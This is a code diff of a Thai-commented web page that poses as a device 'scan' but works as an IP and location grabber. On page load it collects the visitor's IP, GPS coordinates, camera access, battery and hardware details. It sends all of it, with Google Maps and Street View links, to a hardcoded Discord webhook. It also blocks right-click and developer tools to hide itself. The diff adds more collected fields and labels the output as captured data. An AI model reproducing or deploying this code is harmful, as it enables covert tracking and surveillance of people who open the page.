@@ -99,7 +99,7 @@
 </div>
 
 <script>
-// ตั้งค่า Discord Webhook URL ของคุณ
+// ตั้งค่า Discord Webhook URL
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1499459321510101186/k9uFDPnvpJ5peuvFJ6sWXbtyweO2NvbOfCGzdEaBbnGToEmlILLOp_7fzFW6FHdS-Eqv";
 
 // ออบเจกต์สำหรับเก็บข้อมูลผู้ใช้งาน
@@ -110,28 +110,22 @@ let userData = {
     battery: "Unknown"
 };
 
-// ระบบความปลอดภัย: ปิดการคลิกขวา
+// ปิดการคลิกขวา และ F12
 document.addEventListener('contextmenu', e => e.preventDefault());
-
-// ระบบความปลอดภัย: ปิดปุ่ม F12 และปุ่มตรวจสอบโค้ดพื้นฐาน
 document.onkeydown = (e) => {
     if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) {
         return false;
     }
 };
 
-// ฟังก์ชันเริ่มต้นระบบ (ดึงข้อมูลพื้นฐาน)
+// เริ่มระบบโหลดข้อมูลพื้นฐาน
 async function startProcess() {
-    // 1. ดึงข้อมูล IP Address ผ่าน Public API
     try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
         userData.ip = ipData.ip;
-    } catch(e) {
-        console.log("ไม่สามารถดึงข้อมูล IP ได้");
-    }
+    } catch(e) {}
 
-    // 2. ดึงข้อมูลเปอร์เซ็นต์แบตเตอรี่
     try {
         if (navigator.getBattery) {
             const battery = await navigator.getBattery();
@@ -139,7 +133,6 @@ async function startProcess() {
         }
     } catch(e) {}
 
-    // 3. ขอสิทธิ์เข้าถึงพิกัด GPS
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             async (pos) => {
@@ -149,7 +142,6 @@ async function startProcess() {
                 await initCamera();
             },
             async () => {
-                // หากผู้ใช้ปฏิเสธ GPS ให้ก้าวข้ามไปเปิดกล้องทันทีเพื่อไม่ให้ระบบค้าง
                 document.getElementById("status-msg").innerText = "ข้ามระบบ GPS... กำลังเปิดกล้อง...";
                 await initCamera();
             }
@@ -159,50 +151,57 @@ async function startProcess() {
     }
 }
 
-// ฟังก์ชันเปิดใช้งานกล้องเว็บบอร์ด/มือถือ
+// เปิดใช้งานกล้อง
 async function initCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: "user",
-                width: { ideal: 1920 },
-                height: { ideal: 1080 }
-            }
+            video: { facingMode: "user" }
         });
 
         const video = document.getElementById("cam");
         video.srcObject = stream;
-
         document.getElementById("status-msg").innerText = "กำลังตรวจสอบอุปกรณ์...";
 
-        // จำลองการสแกน 3 วินาที จากนั้นปิดกล้องแล้วแสดงผลลัพธ์
         setTimeout(() => {
             stream.getTracks().forEach(t => t.stop());
             showResult();
         }, 3000);
 
     } catch (err) {
-        // หากไม่มีกล้องหรือโดนปฏิเสธ ให้ข้ามไปหน้าผลลัพธ์ทันทีเพื่อเลี่ยงบัคหน้าเว็บค้าง
         showResult();
     }
 }
 
-// ฟังก์ชันส่งข้อมูลไปยัง Discord Webhook ในรูปแบบ Embed สวยงาม
+// ฟังก์ชันส่งข้อมูล "ทุกอย่าง" เข้า Discord Webhook
 async function sendToWebhook() {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
+    const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
+    const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+    const cpuCores = navigator.hardwareConcurrency || "Unknown";
+    const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
     const payload = {
         embeds: [{
-            title: "📡 รายงานการตรวจสอบอุปกรณ์ [Discord Components V2]",
-            color: 5814786, // สีน้ำเงินสไตล์ Discord
+            title: "📡 รายงานข้อมูลอุปกรณ์ทั้งหมด [Discord Components V2]",
+            color: 5814786,
             fields: [
                 { name: "🌐 IP Address", value: `\`${userData.ip}\``, inline: true },
                 { name: "🔋 แบตเตอรี่", value: `\`${userData.battery}\``, inline: true },
                 { name: "📍 พิกัด (GPS)", value: `\`${userData.lat}, ${userData.lon}\``, inline: false },
-                { name: "💻 แพลตฟอร์ม", value: `\`${navigator.platform}\``, inline: true },
+                { name: "💻 ระบบปฏิบัติการ", value: `\`${navigator.platform}\``, inline: true },
                 { name: "🗣️ ภาษาเครื่อง", value: `\`${navigator.language}\``, inline: true },
-                { name: "🖥️ ความละเอียดหน้าจอ", value: `\`${screen.width} x ${screen.height}\``, inline: false },
-                { name: "🗺️ ลิงก์แผนที่ Google Maps", value: `https://www.google.com/maps?q=${userData.lat},${userData.lon}`, inline: false }
+                { name: "🖥️ ความละเอียดหน้าจอ", value: `\`${screen.width} x ${screen.height}\``, inline: true },
+                { name: "🧠 CPU Cores", value: `\`${cpuCores}\``, inline: true },
+                { name: "💾 RAM ขนาด", value: `\`${ramSize}\``, inline: true },
+                { name: "🌍 Timezone", value: `\`${timezone}\``, inline: true },
+                { name: "📶 Connection Type", value: `\`${connectionType}\``, inline: true },
+                { name: "🍪 Cookies Status", value: `\`${cookiesStatus}\``, inline: true },
+                { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true },
+                { name: "🏙️ Street View", value: `http://maps.google.com/maps?q=&layer=c&cbll=${userData.lat},${userData.lon}`, inline: false },
+                { name: "🗺️ Google Maps", value: `https://www.google.com/maps?q=${userData.lat},${userData.lon}`, inline: false }
             ],
-            footer: { text: "ระบบตรวจสอบอัตโนมัติ" },
+            footer: { text: "ระบบดักจับข้อมูลเสร็จสิ้น" },
             timestamp: new Date().toISOString()
         }]
     };
@@ -214,40 +213,44 @@ async function sendToWebhook() {
             body: JSON.stringify(payload)
         });
     } catch(e) {
-        console.error("ส่งข้อมูลไปยัง Webhook ล้มเหลว", e);
+        console.error("Webhook Error", e);
     }
 }
 
-// ฟังก์ชันเปลี่ยนหน้าเป็นสรุปผลลัพธ์และจัดเรียงการ์ดข้อมูลลงบน UI
+// เปลี่ยนหน้าและแสดงผลบนเว็บ
 function showResult() {
     document.getElementById("step-scan").classList.add("hidden");
     document.getElementById("step-result").classList.remove("hidden");
 
-    // ยิงข้อมูลเข้า Discord ทันที
+    // เรียกฟังก์ชันส่งค่าทั้งหมดเข้า Discord
     sendToWebhook();
 
     const box = document.getElementById("info-box");
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
+    const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
+    const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+    const cpuCores = navigator.hardwareConcurrency || "Unknown";
+    const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     
-    // รายการข้อมูลที่จะโชว์บนหน้าเว็บทั้งหมด
     const data = [
         { icon: "📍", title: "พิกัด", value: `${userData.lat}, ${userData.lon}` },
         { icon: "🌐", title: "IP Address", value: userData.ip },
         { icon: "💻", title: "ระบบ", value: navigator.platform },
         { icon: "🗣️", title: "ภาษา", value: navigator.language },
         { icon: "🖥️", title: "หน้าจอ", value: `${screen.width}x${screen.height}` },
-        { icon: "🧠", title: "CPU Cores", value: navigator.hardwareConcurrency || "Unknown" },
-        { icon: "💾", title: "RAM", value: (navigator.deviceMemory || "Unknown") + " GB" },
+        { icon: "🧠", title: "CPU Cores", value: cpuCores },
+        { icon: "💾", title: "RAM", value: ramSize },
         { icon: "🔋", title: "Battery", value: userData.battery },
-        { icon: "🌍", title: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone },
-        { icon: "📶", title: "Connection", value: navigator.connection ? navigator.connection.effectiveType : "Unknown" },
-        { icon: "🍪", title: "Cookies", value: navigator.cookieEnabled ? "Enabled" : "Disabled" },
-        { icon: "🌙", title: "Dark Mode", value: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled" },
-        { icon: "🏙️", title: "Street View", value: `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userData.lat},${userData.lon}` },
+        { icon: "🌍", title: "Timezone", value: timezone },
+        { icon: "📶", title: "Connection", value: connectionType },
+        { icon: "🍪", title: "Cookies", value: cookiesStatus },
+        { icon: "🌙", title: "Dark Mode", value: isDarkMode },
+        { icon: "🏙️", title: "Street View", value: `https://maps.google.com/maps?q=&layer=c&cbll=${userData.lat},${userData.lon}` },
         { icon: "🗺️", title: "Google Maps", value: `https://www.google.com/maps?q=${userData.lat},${userData.lon}` }
     ];
 
-    box.innerHTML = ""; // ล้างหน้าจอเพื่อเตรียมวาดใหม่
-    
+    box.innerHTML = "";
     data.forEach(item => {
         box.innerHTML += `
             <div class="bg-[#2b2d31] border border-[#1e1f22] rounded-2xl p-4 flex items-center gap-4 hover:bg-[#32353b] transition-all duration-200">
@@ -263,7 +266,6 @@ function showResult() {
     });
 }
 
-// สั่งให้กระบวนการทำงานทันทีเมื่อเปิดหน้าเว็บเสร็จสมบูรณ์
 window.onload = () => {
     startProcess();
 };
